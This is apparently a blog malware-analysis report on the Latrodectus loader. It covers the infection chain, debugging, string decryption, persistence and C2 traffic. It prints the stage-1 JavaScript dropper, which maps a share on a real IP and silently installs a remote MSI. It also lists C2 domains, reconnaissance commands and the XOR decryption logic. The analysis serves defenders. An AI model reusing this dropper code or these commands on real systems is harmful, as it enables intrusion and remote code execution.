---
title: "Malware Analysis Article"
date: 2024-07-18
description: ""
tags: ["Malware Analysis"]
type: post
weight: 20
showTableOfContents: true
---

# Latredocus Exposed: Unraveling the New Cyber Threat


## Overview

In this report, we delve into the intricate details of Latrodectus, a new and sophisticated malware loader that has surfaced in the cybersecurity landscape. First identified in phishing campaigns in early March 2024, Latrodectus is believed to be the successor to the notorious IcedID malware. This report aims to provide a comprehensive analysis of Latrodectus, including its infection chain, capabilities, and the broader implications for cybersecurity.


## Infection Chain and Distribution

The initial discovery of Latrodectus was made through a surge in email phishing campaigns. These campaigns commonly use oversized JavaScript files that exploit Windows Management Instrumentation (WMI) to invoke msiexec.exe and install a malicious MSI file from a WEBDAV share. This infection chain is a sophisticated method that leverages well-known system utilities to avoid detection.

## Technical Analysis

Latrodectus exemplifies the evolution of malware sophistication, integrating advanced techniques to infiltrate, persist, and evade detection on compromised systems. This technical analysis delves into the specifics of its infection chain, operational capabilities, evasion strategies, persistence mechanisms, and command-and-control (C2) communication protocols. Understanding these facets is crucial for cybersecurity professionals aiming to effectively detect, analyze, and counteract the threat posed by Latrodectus.

### Stage : 1 
#### Javascript Payload
``` 
MD5 hash : 7d42412a93368417fed25f581c536e5a
```
This JavaScript code performs network drive mapping, installs an MSI package, and can execute additional embedded code. Here's a breakdown:

#### Key Variables and Function

1. **Setup Objects:**
   ```javascript
   var network = new ActiveXObject("WScript.Network");
   var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
   var attempt = 0;
   var connected = false;
   ```
   The above code snippet is trying to interact with network resources using Windows Script Host's network capabilities through ActiveXObject. It also uses WMI to manage system information, trying to check for connectivity by setting a flag after attempting a connection.

2. **Check if Drive is Mapped:**
   ```javascript
   function isDriveMapped(letter) {
       var drives = network.EnumNetworkDrives();
       for (var i = 0; i < drives.length; i += 2) {
           if (drives.Item(i) === letter) {
               return true;
           }
       }
       return false;
   }
   ```
   The code snippet uses `EnumNetworkDrives()` to check if a specific drive letter (`letter`) is currently mapped on the system. This method is commonly utilized by malware to identify network resources accessible from an infected machine. By determining mapped drives, malware can potentially spread across network shares, access sensitive data, or execute further malicious activities within the network environment. 

#### Drive Mapping Logic

3. **Try Mapping Drives from 'Z' to 'A':**
   ```javascript
   for (var driveLetter = 90; driveLetter >= 65 && !connected; driveLetter--) {
       var letter = String.fromCharCode(driveLetter) + ":";
       if (!isDriveMapped(letter)) {
           try {
               network.MapNetworkDrive(letter, "\\\\95.164.3.171@80\\share\\");
               connected = true;
               break;
           } catch (e) {
               attempt++;
           }
       }
   }
   ```
   This snippet attempts to map network drives from Z: to A: (corresponding to drive letters 90 to 65) until it successfully maps to "\\95.164.3.171@80\share\" or exhausts all attempts. It uses `MapNetworkDrive()` to connect to a remote share, potentially allowing malware to access or spread across network resources, a common tactic for ```lateral movement``` in cyberattacks.

4. **Fallback Mapping with `net use`:**
   ```javascript
   if (!connected && attempt > 5) {
       var command = 'net use ' + letter + ' \\\\95.164.3.171@80\\share\\ /persistent:no';
       wmi.Get("Win32_Process").Create(command, null, null, null);

       var startTime = new Date();
       while (new Date() - startTime < 3000) {} // Wait 3 seconds

       connected = isDriveMapped(letter);
   }
   ```
The above JavaScript snippet verifies whether the network drive connection failed and if the number of attempts exceeds 5. If these conditions are met, it utilizes WMI (`Win32_Process`) to execute a command (`net use`) that maps the network drive `letter` to "\\95.164.3.171@80\share\" without persistence. Following execution, it includes a 3-second wait period to confirm the successful mapping of the drive (`isDriveMapped(letter)` returning true).

#### MSI Installation

5. **Install MSI if Connected:**
   ```javascript
   if (connected) {
       var installCommand = 'msiexec.exe /i \\\\95.164.3.171@80\\share\\cisa.msi /qn';
       wmi.Get("Win32_Process").Create(installCommand, null, null, null);

       try {
           network.RemoveNetworkDrive(letter, true, true);
       } catch (e) {}
   } else {
       WScript.Echo("Failed.");
   }
   ```
   The important part of the code snippet is the execution of the `msiexec.exe` command (`'msiexec.exe /i \\\\95.164.3.171@80\\share\\cisa.msi /qn'`) using WMI (`Win32_Process`). This command attempts to silently install an MSI package (`cisa.msi`) located on a remote share (`\\95.164.3.171@80\share`). If `connected` is true (indicating successful network drive mapping), the installation proceeds; otherwise, an error message is echoed via `WScript.Echo("Failed.")`.



### Stage : 2 
#### Basic Static Analysis of the MSI File
``` 
MD5 hash : c4e8f3e02fd50a4051f11048f1355726
```
As previously mentioned, the next phase of the attack involves the deployment of a malicious .msi file on the victim's machine. To unveil the intricacies of this payload, we turn to Orca, a powerful tool for dissecting MSI files. What we discovered through this analysis is both alarming and fascinating.

When we cracked open the .msi file using Orca, we found a treasure trove of malicious components carefully hidden within. This file is not just a simple installer; it’s a cleverly disguised arsenal designed to establish a foothold on the target system.

![image](https://hackmd.io/_uploads/B1ODxL4OA.png)

<figcaption><center>Fig. 1: DLL execution via rundll32 in CustomAction properties.</center></figcaption>

![image](https://hackmd.io/_uploads/rkcsgIE_0.png)
<figcaption><center>Fig. 2: Validating the presence of the required DLL during installation.</center></figcaption>

Now that we have gained some initial insights into the DLL, our next step involves a deeper dynamic analysis by executing the installer.

#### Basic Dynamic Analysis of the MSI File
Running the installer and closely monitoring its behavior with ProcMon provides valuable insights and observations.
![image](https://hackmd.io/_uploads/B14W9uEuA.png)
<figcaption><center>Fig. 3: Process tree graph depicting msiexec.exe installation of the .msi file.</center></figcaption>

![image](https://hackmd.io/_uploads/H1_4cu4_C.png)
<figcaption><center>Fig. 4: Process tree graph illustrating the execution of two instances of rundll32.exe.</center></figcaption>

![image](https://hackmd.io/_uploads/rk1Zj_EuA.png)
<figcaption><center>Fig.5 : Process Tree Graph showing that one more DLL is running with the same export.</center></figcaption>

### Stage : 3 


#### Analyzing the Payload: Falcon.dll Behavior Under the Debugger
In our previous section, we explored the installation process of the .sil installer and observed that falcon.dll, upon initial execution, duplicates itself, enabling the dropped DLL to function identically to the original. Now, we proceed to dissect falcon.dll using a debugger to uncover its behavior and functionalities in greater detail.
![image](https://hackmd.io/_uploads/Hkz2AySdC.png)
<figcaption><center>Fig. 6: Setting Breakpoints in x64dbg to Extract the Actual Payload</center></figcaption>

![image](https://hackmd.io/_uploads/rJY6dlrOR.png)
<figcaption><center>Fig. 7: Halting Execution at the Second Breakpoint before VirtualAlloc Returns</center></figcaption>
<br>

We observe that a PE file is loaded into memory during the dump. We extract the file from the dump and proceed with our analysis to reverse engineer the final stage.

### Stage : 4 
####  Static Analysis of the payload : - Payload.dll
```
MD5 hash : 703ffdc708f1f0779bb0f6da1b8cbc9a
file type : PE32+ executable (DLL) (GUI) x86-64, for MS Windows
```
Upon encountering gibberish output from normal string analysis, we opted to employ ```FLOSS``` for deeper insights into the binary's string contents. 
It is generally observed that malware authors tend to use certain known or custom encryption schemes to hide thge actual activity from analysts and make the process of analysis a tedious process.
However we have tools like ```FLOSS``` which uses advanced static analysis techniques to deobfuscate the strings.
##### FLOSS STRINGS 
```bash
INFO: floss.results: LogonTrigger
INFO: floss.results: <!DOCTYPE
INFO: floss.results: /c net group "Domain Admins" /domain
INFO: floss.results: C:\Windows\System32\cmd.exe
INFO: floss.results: &systeminfo=
INFO: floss.results: "pid":
INFO: floss.results: Local AppData
INFO: floss.results: &desklinks=[
INFO: floss.results: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)
INFO: floss.results: %d.dat
INFO: floss.results: COMMAND
INFO: floss.results: %s%d.dll
INFO: floss.results: %s%s
INFO: floss.results: /c nltest /domain_trusts /all_trusts
INFO: floss.results: Content-Type: application/x-www-form-urlencoded
INFO: floss.results: AppData
INFO: floss.results: /c whoami /groups
INFO: floss.results: /c ipconfig /all
INFO: floss.results: &net_config_ws=
INFO: floss.results: %s\%s
INFO: floss.results: URLS|%d|%s
INFO: floss.results: Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
INFO: floss.results: Littlehw
INFO: floss.results: :wtfbbq
INFO: floss.results: &proclist=[
INFO: floss.results: &net_view_all=
INFO: floss.results: .dll
INFO: floss.results: /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
INFO: floss.results: Updater
INFO: floss.results: ERROR
INFO: floss.results: "proc":
INFO: floss.results: &domain_trusts=
INFO: floss.results: PT0S
INFO: floss.results: .exe
INFO: floss.results: Desktop
INFO: floss.results: /c net view /all /domain
INFO: floss.results: C:\Windows\System32\wbem\wmic.exe
INFO: floss.results: POST
INFO: floss.results: /files/
INFO: floss.results: &computername=%s
INFO: floss.results: files/bp.dat
INFO: floss.results: %04X%04X%04X%04X%08X%04X
INFO: floss.results: URLS
INFO: floss.results: /c systeminfo
INFO: floss.results: \update_data.dat
INFO: floss.results: https://aytobusesre.com/live/
INFO: floss.results: &net_wmic_av=
INFO: floss.results: Custom_update
INFO: floss.results: runnung
INFO: floss.results: &net_group=
INFO: floss.results: CLEARURL
INFO: floss.results: /c net config workstation
INFO: floss.results: Startup
INFO: floss.results: "subproc": [
INFO: floss.results: init -="%s\%s"
INFO: floss.results: &domain_trusts_all=
INFO: floss.results: %s\%d.dll
INFO: floss.results: &ipconfig=
INFO: floss.results: /c net view /all
INFO: floss.results: html
INFO: floss.results: https://scifimond.com/live/
INFO: floss.results: C:\WINDOWS\SYSTEM32\rundll32.exe %s,%s
INFO: floss.results: &domain=%s
INFO: floss.results: rundll32.exe
INFO: floss.results: front
INFO: floss.results: /c nltest /domain_trusts
INFO: floss.results: Personal
INFO: floss.results: 12345
INFO: floss.results: \Registry\Machine\
INFO: floss.results: %s%d.exe
INFO: floss.results: &whoami_group=
INFO: floss.results: /c wmic.exe /node:localhost /namespace:\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivir
INFO: floss.results: wmic
INFO: floss.results: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
INFO: floss.results: "%s", %s %s
INFO: floss.results: C:\WINDOWS\SYSTEM32\rundll32.exe %s
INFO: floss.results: Update_%x
INFO: floss.results: &net_view_all_domain=
INFO: floss.results: %04X%04X%04X%04X%08X%04X
```

From the analysis above, several key insights can be drawn regarding the LATREDOCUS malware:

1. **Custom String Decryption Routine**: The presence of a custom string decryption routine indicates sophisticated obfuscation techniques employed by LATREDOCUS to load essential strings dynamically. This method enhances resilience against static analysis, complicating detection and analysis efforts.

2. **Decrypted Command Strings**: The decrypted strings reveal a repertoire of commands executed by LATREDOCUS. These commands are pivotal in understanding the malware's operational capabilities, encompassing various malicious activities such as data exfiltration, system manipulation, and possibly command and control (C2) communication.

3. **Domain Names for C2 Communication**: Identification of domain names embedded within the decrypted strings provides crucial intelligence on LATREDOCUS's communication channels with its command and control infrastructure. This insight is instrumental in tracking and mitigating the malware's network-based activities.

This analysis underscores the malware's sophisticated design and operational complexity, highlighting the importance of advanced techniques and tools in unraveling its malicious intent and mitigating its impact effectively.


### Delving into Payload.dll: Reverse Engineering and Analysis

In this phase, our focus shifts to the thorough reverse engineering and analysis of the payload.dll extracted from the preceding stages of our investigation. This pivotal component promises deeper insights into the inner workings of LATREDOCUS malware.


![image](https://hackmd.io/_uploads/SJVTYWBuC.png)
<figcaption><center>Fig. 8: Exported functions from Payload.dll</center></figcaption>
<br>

we open the run function in IDA and start looking what all the file is trying to do!!.

![image](https://hackmd.io/_uploads/HkcA5ZS_0.png)
<figcaption>Fig.9 : Dynamic API Resolution</figcaption>
<br>

After renaming functions in IDA and leveraging the hashDB plugin, we have identified the following critical functions within Payload.dll. Let's delve into their purpose:

a. **resolve_kernel_32_dll**: This function dynamically resolves kernel32.dll, enabling access to essential Windows API functions crucial for the malware's operation.

b. **resolve_ntdll_dll**: This function dynamically resolves ntdll.dll, facilitating access to low-level system functions necessary for advanced system interactions.

c. **resolve_kernel32_functions**: This function dynamically resolves specific functions within kernel32.dll, optimizing the malware's capability to interact with the operating system.

Additionally, other functions within the DLL focus on dynamically resolving various APIs and essential DLLs, enhancing the malware's versatility in executing diverse functionalities across compromised systems.


``` python
Function decrypt_string(data_enc: byte array, xor_key: integer) -> string:
    Initialize decrypted_strings as an empty byte array

    For each index and byte in data_enc:
        Compute decrypted_byte as byte XOR ((xor_key + index + 1) AND 0xFF)
        Append decrypted_byte to decrypted_strings

    Return format_string(decrypted_strings)
```
The pseudocode illustrates a decryption algorithm used by the malware to dynamically decrypt strings essential for its operations. It employs XOR encryption with a key dynamically computed based on the byte index and a constant value. This method obfuscates the original strings within data_enc, ensuring they are retrieved and formatted for use by the malware at runtime. Such techniques are common in malware to evade detection and analysis, requiring careful examination to understand the encrypted data's purpose and the malware's functionalities.



### Malware Capabilities Analysis

#### 1. Mutex Lock Creation
The Latredocus malware utilizes a hardcoded mutex string, "runnung", to establish a mutex lock during execution. This mechanism serves to verify whether the malware is already running on the infected system, preventing multiple instances from operating concurrently. The use of a hardcoded mutex string is considered a programming flaw, potentially indicating oversight or a compromise in security practices.

#### 2. Process Enumeration
Following the decryption of strings and dynamic API resolution, Latredocus engages in process enumeration on the compromised system. This activity involves identifying and cataloging the currently running processes. By enumerating processes, the malware gains insights into the system's operational state and potentially identifies targets for further exploitation or interaction.

These capabilities highlight Latredocus's operational strategy, focusing on persistence through mutex management and system reconnaissance via process enumeration. Understanding these functionalities is crucial for developing effective mitigation strategies and enhancing system defenses against such sophisticated threats.
    ![image](https://hackmd.io/_uploads/r13XD9BdC.png)
    <figcaption><center>Fig. 10 Process Enumeration function used to collect infromation about the system</center></figcaption>
    
    ![image](https://hackmd.io/_uploads/HyL6v9HOR.png)
    <figcaption><center>
    Fig 11 : Details regarding each process to understand about their relationships with other processes</center></figcaption>


#### 3. System Information Collection

Latredocus executes a series of commands to gather comprehensive information about the compromised system. These commands provide insights into various aspects of the victim's environment, aiding in further malicious activities.

Commands executed by Latredocus include:

```
C:\Windows\System32\cmd.exe /c ipconfig /all
C:\Windows\System32\cmd.exe /c systeminfo
C:\Windows\System32\cmd.exe /c nltest /domain_trusts
C:\Windows\System32\cmd.exe /c nltest /domain_trusts /all_trusts
C:\Windows\System32\cmd.exe /c net view /all /domain
C:\Windows\System32\cmd.exe /c net view /all
C:\Windows\System32\cmd.exe /c net group "Domain Admins" /domain
C:\Windows\System32\wbem\wmic.exe /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
C:\Windows\System32\cmd.exe /c net config workstation
C:\Windows\System32\cmd.exe /c wmic.exe /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed
C:\Windows\System32\cmd.exe /c whoami /groups
```

Each command retrieves specific information about network configuration, system details, domain trusts, group memberships, antivirus status, and more. This data collection phase is crucial for the malware's reconnaissance efforts, enabling it to gather intelligence necessary for subsequent actions.

The gathered information is structured and stored as follows:

```
&ipconfig=
&systeminfo=
&domain_trusts=
&domain_trusts_all=
&net_view_all_domain=
&net_view_all=
&net_group=
&wmic=
&net_config_ws=
&net_wmic_av=
&whoami_group=
```

This systematic approach allows Latredocus to maintain a comprehensive profile of the victim system, facilitating targeted attacks and informed decision-making during its operation. Understanding these capabilities is essential for detecting and mitigating the impact of such sophisticated malware threats.

#### 4. C2 Communication

Latredocus establishes communication with its command-and-control (C2) server to receive commands and transmit victim information. The malware encrypts its requests using base64 and RC4 encryption with a hardcoded password of 12345 to obfuscate the transmitted data.

The initial POST request sent to the C2 server includes the following details:

```
POST https://aytobusesre.com/live/ HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)
Host: aytobusesre.com
Content-Length: 256
Cache-Control: no-cache
```

This request contains victim information and configuration details, effectively registering the infected system with the C2 server. The use of HTTPS ensures secure transmission of data between the malware and the C2 server, while encryption helps protect the contents of the communication from detection and analysis.

Understanding Latredocus's C2 communication mechanisms is crucial for cybersecurity professionals to detect and mitigate the malware's impact on compromised systems and prevent further unauthorized activities.

#### 5. Anti-Analysis Techniques
Latredocus employs several anti-analysis techniques to evade detection and hinder analysis efforts:
    ![image](https://hackmd.io/_uploads/HkVxs3Su0.png)
     <figcaption><center>Fig. 11 Code shows that malware does and the anti-debugging check</center></figcaption>
    The malware actively checks for dynamic debugging environments and terminates execution upon detection. This behavior is crucial for thwarting attempts to inspect its runtime behavior and evade detection by security analysts.
    ![image](https://hackmd.io/_uploads/rJxfnnHOC.png)
    <figcaption><center>Fig. 12 shows the anti-sandbox and virtual machine check</center></figcaption>
    
Latredocus also includes mechanisms to detect virtualized environments such as sandboxes. By monitoring the number of running processes and other environmental cues, it attempts to identify if it is executing in an isolated or monitored environment. This technique helps the malware evade detection during analysis and prevent security researchers from accurately assessing its capabilities.

#### 6. Malware Setup followed with Persistence
Latredocus establishes itself on infected systems with careful setup and persistence mechanisms:
    ![image](https://hackmd.io/_uploads/HyY0j6ruR.png)
    <figcaption><center>Fig.14 Malware creates a copy of the falcon.dll and drops it into shown folder.</center></figcaption>
After the initial installation, Latredocus drops a copy of falcon.dll into a specific directory on the system. This step ensures redundancy and allows the malware to continue functioning even if the original DLL is removed or altered.
    ![image](https://hackmd.io/_uploads/BJEIgCrOC.png)
    <figcaption><center>Fig.15 Scheduled Task created </center></figcaption>
Latredocus creates a scheduled task named "Updater" as part of its persistence strategy. This task is hardcoded within the malware and ensures that the malicious activities resume automatically at predefined intervals or conditions.
    ![image](https://hackmd.io/_uploads/B1ROeRrOA.png)
    <figcaption><center>Fig.16 Details about the created scheduled task for persistence</center></figcaption>
    The scheduled task created by Latredocus includes specific configurations and parameters designed to maintain persistence. This includes details such as execution triggers, frequency, and actions taken upon execution, ensuring the malware's continuous operation on the infected system.

These setup and persistence techniques demonstrate Latredocus's intent to maintain long-term presence on infected systems, making it challenging for security measures to detect and remove effectively.

## Conclusion
Latrodectus represents a formidable challenge for cybersecurity professionals. Its advanced evasion techniques, versatile capabilities, and persistent nature make it a significant threat. This report aims to equip cybersecurity teams with the knowledge needed to understand and defend against Latrodectus. By staying informed about the latest developments and adopting proactive defense strategies, organizations can mitigate the risks posed by this and other emerging malware threats.

## Key Takeaways
1. Infection Chain: Latrodectus uses sophisticated methods involving JavaScript and WMI to infiltrate systems.
Capabilities: It can deploy additional payloads, perform extensive system enumeration, and execute various commands.
2. Evasion Techniques: Obfuscation and anti-analysis checks are key to its stealth.
3. Persistence: Scheduled tasks ensure it remains active on infected systems.
4. Command-and-Control: Robust C2 communication facilitates its adaptability and resilience.
5. Development: New features indicate ongoing development and a possible connection to IcedID.

    





